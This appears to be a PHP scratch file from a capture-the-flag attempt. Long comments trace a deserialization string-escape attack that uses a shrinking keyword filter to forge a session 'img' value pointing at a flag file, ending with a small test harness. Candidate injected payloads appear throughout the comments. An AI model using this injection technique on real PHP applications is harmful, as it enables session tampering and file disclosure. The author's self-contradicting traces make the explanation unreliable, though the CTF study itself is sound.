<?php
// Let me trace through the parsing more carefully
// 
// Filtered: a:3:{s:4:"user";s:75:"";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// The parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key "user"
// s:75:" - value is string of length 75
//   Content at position after opening quote: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   Let me count this: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   " = 1
//   ; = 1
//   } = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   8 = 1
//   : = 1
//   " = 1
//   f = 1
//   u = 1
//   n = 1
//   c = 1
//   t = 1
//   i = 1
//   o = 1
//   n = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   1 = 1
//   0 = 1
//   : = 1
//   " = 1
//   s = 1
//   h = 1
//   o = 1
//   w = 1
//   _ = 1
//   i = 1
//   m = 1
//   a = 1
//   g = 1
//   e = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   3 = 1
//   V = 1
//   l = 1
//   c = 1
//   3 = 1
//   R = 1
//   f = 1
//   a = 1
//   W = 1
//   1 = 1
//   n = 1
//   L = 1
//   n = 1
//   B = 1
//   u = 1
//   Z = 1
//   w = 1
//   = = 1
//   = = 1
//   " = 1
//   ; = 1
//   } = 1
//   Total: 76 chars
//   
//   Parser reads 75 bytes: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";
//   (missing the last })
//   
//   Then parser continues from: }
//   This is just }
//   The parser expects a key (s:N:"..."), but sees }
//   This causes an error!

// So the problem is that after reading the user value, the parser expects more elements
// but sees a closing brace

// Let me try a different approach:
// What if we inject content that includes the remaining elements?

// The key insight: we need to inject content that:
// 1. Closes the current value
// 2. Adds the remaining elements (function and img)
// 3. Closes the array

// Let's try:
// user = 'flag' * 18 + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// 'flag' * 18 = 72 chars
// '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}' = 66 chars
// Total: 138 chars
// 
// After filter: 66 chars
// 
// Serialized: s:138:"flag...flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:138:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Parser reads 138 bytes from ""
// Content available: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Let me count: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// That's 66 + 73 = 139 chars
// 
// Parser reads 138 bytes, leaving 1 char (the last })
// 
// First 138 bytes: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw=="; (missing the last })
// 
// Then parser continues from: }
// This is just }
// The parser expects a key, but sees }
// This closes the array!

// But wait, the array count is 3, and the parsed content has:
// user = (the 138-byte string)
// function = show_image
// img = ZDBnM19mMWFnLnBocA==
// 
// That's 3 elements! But the user value is wrong...

// Hmm, let me trace through more carefully.
// 
// After reading s:138:"...", the parser has read the user value
// The user value is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";
// 
// Then parser continues from: }
// 
// Wait, that means the parser only sees ONE element (user)!
// But the array count says 3!

// I think I'm misunderstanding how the parser works.
// Let me trace through a normal serialized string:
// 
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// Parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:10:"show_image" - value 2
// s:3:"img" - key 3
// s:20:"BASE64" - value 3
// } - end of array
// 
// So the parser reads key-value pairs until it sees }

// Now let's trace through the escaped version:
// a:3:{s:4:"user";s:138:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:138:" - value 1 is string of length 138
//   Content: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw=="; (138 chars)
//   Note: this includes the closing " and ;
//   
// Then parser continues from: }
// Parser expects key 2, but sees }
// Parser thinks array is done, but count says 3!
// This is an error!

// So the issue is that the "injected" content is being read as the VALUE of user,
// not as separate key-value pairs!

// The key insight: when the parser reads s:138:"...", it reads 138 bytes as the VALUE
// It doesn't parse the content as key-value pairs!

// So we need a different approach.
// 
// What if we use the escape to inject content BEFORE the closing quote of the value?
// 
// user = 'flag' + injection
// injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter:
// s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Parser reads:
// s:45:" - value is string of length 45
//   Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}" (41 chars)
//   Parser needs 4 more chars, reads from next field
//   Next field: ";s:8:"function"...
//   Reads: ";s: (4 chars)
//   
//   Total value: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s: (45 chars)
//   
// Then parser continues from: 8:"function"...
// Parser expects a key (s:N:"..."), but sees "8:..."
// This is an error!

// Hmm, this is tricky. Let me think about it differently.
// 
// The key insight from the 0CTF 2016 writeup:
// When the filter SHRINKS the string, the serialized length is LARGER than actual
// The parser reads past the intended boundary
// 
// The trick is to make the "overflow" read into content that forms valid key-value pairs

// Let me try:
// user = 'flag' + padding + injection
// 
// Where:
// - padding is chosen so that after filter, the parser reads exactly the right amount
// - injection is the content we want to inject as key-value pairs

// The challenge is that the parser reads the overflow as part of the VALUE, not as separate elements!

// Wait, I think I finally understand the trick!
// 
// When the parser reads s:N:"...", it reads N bytes as the value
// If the value contains ";s:X:"...", the parser doesn't interpret this as a new element
// It just reads it as part of the string value!
// 
// BUT, if the overflow causes the parser to read PAST the closing quote and semicolon,
// then the parser continues parsing from that point!
// 
// Let me trace through:
// s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Parser reads:
// s:45:" - value is string of length 45
//   Content starts at position after opening quote
//   Position 0: " (this is the first char of the content)
//   Position 1: ;
//   ...
//   Position 40: }
//   Position 41: " (this should be the closing quote)
//   Position 42: ; (this should be the semicolon)
//   Position 43: s (start of next element)
//   Position 44: :
//   Position 45: 8
//   
//   Wait, the parser reads 45 bytes, so it reads positions 0-44
//   The content is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8 (45 chars)
//   
// Then parser continues from position 45: :"function"...
// Parser expects a key, but sees ":"
// This is an error!

// I think the issue is that I'm not correctly understanding how the overflow works.
// 
// Let me re-read the 0CTF 2016 writeup...

// Actually, let me try a different approach:
// What if we use the escape to inject content that INCLUDES the array count?

// The serialized string starts with a:N:{
// If we can inject a new array with a different count...

// Actually, that won't work because the array count is at the beginning.

// Let me try yet another approach:
// What if we use the escape to "consume" the entire remaining structure?

// The remaining structure after user value: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// Length: 73 chars

// If we generate 73 chars of overflow, the parser reads the entire remaining structure
// as part of the user value, and then sees nothing (end of string)
// 
// But the array count says 3, and we only have 1 element!

// Hmm, let me think about this from a different angle.
// 
// What if we DON'T use the escape at all?
// What if we just set the img value directly via extract($_POST)?

// Wait, the code sets img AFTER extract, so we can't directly set it...
// 
// But what if we set img_path?
// img_path = 'd0g3_f1ag.php'
// Then img = sha1(base64_encode('d0g3_f1ag.php'))
// This is a hash, not the base64 we want!

// What if we use a data:// wrapper?
// img_path = 'data://text/plain,ZDBnM19mMWFnLnBocA=='
// Then img = sha1(base64_encode('data://text/plain,ZDBnM19mMWFnLnBocA=='))
// Still a hash!

// The key is that img_path gets sha1'd, so we can't control the final img value directly.

// Let me go back to the escape approach and think more carefully.

// Actually, I just realized something:
// The filter is applied to the SERIALIZED STRING, not to the individual values!
// 
// So if we have:
// s:4:"flag"
// After filter: s:4:""
// 
// The serialized format is: s:LENGTH:"CONTENT";
// The filter removes keywords from CONTENT, but LENGTH stays the same!
// 
// When the parser reads s:4:"", it expects 4 bytes of content
// But the content is empty (0 bytes)
// So the parser reads 4 bytes from the NEXT position in the string!

// This is the key insight!
// 
// After filter: s:4:"";s:8:"function"...
// Parser reads s:4:"" and expects 4 bytes
// Parser reads: ";s: (4 bytes from the next part)
// So the value becomes: ";s:
// 
// Then parser continues from: 8:"function"...
// Parser sees: 8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// This is invalid! "8" is not a valid type!

// So the escape corrupts the structure...

// Wait, let me re-trace this more carefully.
// 
// After filter: a:3:{s:4:"user";s:4:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// Parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key "user"
// s:4:" - value is string of length 4
//   Content: "" (empty, 0 bytes)
//   Parser expects 4 bytes, reads from next position
//   Next position: ";s:8:"function"...
//   Reads 4 bytes: ";s: (wait, that's only 4 chars including the closing quote?)
//   
//   Actually, let me think about this more carefully.
//   The serialized format is: s:N:"CONTENT";
//   After the opening quote, the parser reads N bytes as CONTENT
//   Then it expects the closing quote and semicolon
//   
//   So for s:4:"", the parser:
//   1. Sees opening quote: "
//   2. Reads 4 bytes as content: but there's nothing after the quote!
//   3. The next char is the closing quote: "
//   4. Parser reads: " (1 byte), then ; (1 byte), then s (1 byte), then : (1 byte)
//   5. Total: ";s: (4 bytes)
//   6. Then parser expects closing quote, but sees 8
//   7. Error!

// Hmm, this is getting confusing. Let me just test it in PHP.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Test with user = 'flag'
$_SESSION = [];
$_SESSION['user'] = 'flag';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "=== Test with user='flag' ===\n";
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

// Let me also test what the parser reads
echo "\n=== Manual parsing ===\n";
// After filter: a:3:{s:4:"user";s:4:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position after s:4:": the opening quote
// Parser reads 4 bytes starting from the char after the opening quote
// The char after the opening quote is: " (closing quote)
// Wait, that's the closing quote of the empty string!
// 
// Let me look at the filtered string more carefully:
// a:3:{s:4:"user";s:4:"";s:8:"function";...
// 
// s:4:"" means: string of length 4, content is ""
// But "" is only 2 chars (two quotes), not 4!
// 
// Actually, I think the issue is that the filter removes 'flag' from the content,
// leaving the quotes intact.
// 
// Original: s:4:"flag"
// After filter: s:4:""
// 
// The content between the quotes is now empty (0 bytes)
// But the length says 4
// 
// So the parser reads 4 bytes starting from the position after the opening quote
// Position after opening quote: " (this is the closing quote!)
// Parser reads: " (1 byte), ; (1 byte), s (1 byte), : (1 byte) = 4 bytes
// 
// So the content is: ";s:
// Then parser expects closing quote, but next char is 8
// Error!

// Let me verify this by checking the positions
$filtered = 'a:3:{s:4:"user";s:4:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
echo "Filtered string:\n";
echo $filtered . "\n\n";

// Find position of s:4:"
$pos = strpos($filtered, 's:4:"');
echo "Position of s:4:\": " . $pos . "\n";

// The opening quote is at position $pos + 4
$quote_pos = $pos + 4;
echo "Position of opening quote: " . $quote_pos . "\n";
echo "Char at opening quote: '" . $filtered[$quote_pos] . "'\n";

// The next 4 bytes
echo "Next 4 bytes: '" . substr($filtered, $quote_pos + 1, 4) . "'\n";

